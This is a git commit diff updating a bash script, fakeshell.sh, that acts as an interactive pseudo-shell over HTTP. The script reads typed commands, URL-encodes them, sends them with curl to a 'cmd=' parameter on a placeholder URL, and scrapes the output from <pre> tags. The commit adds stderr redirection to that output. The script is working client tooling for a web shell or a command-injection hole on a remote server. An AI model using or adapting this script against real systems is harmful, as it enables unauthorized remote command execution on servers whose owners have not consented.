129f519c3970a3cb2bcefdaa8b564b0c97410539
Tobias <75316027+TobiasVeiga00@users.noreply.github.com>
2024-01-25 14:58:26 -0300

    Update fakeshell.sh

--- fakeshell.sh
+++ fakeshell.sh
@@ -12,7 +12,7 @@ main_url="url?cmd="
 
 while [ "$command" != "exit" ]; do
   echo -n "$~ " && read -r command
-  command="$(echo $command | tr ' ' '+')"
+  command="$(echo "$command 2>%261" | tr ' ' '+')"
 
   curl -s -X GET "$main_url$command" | grep "<pre>" -A 100 | grep "</pre>" -B 100 | sed 's/<pre>//' | sed 's/<\pre>//'
 done
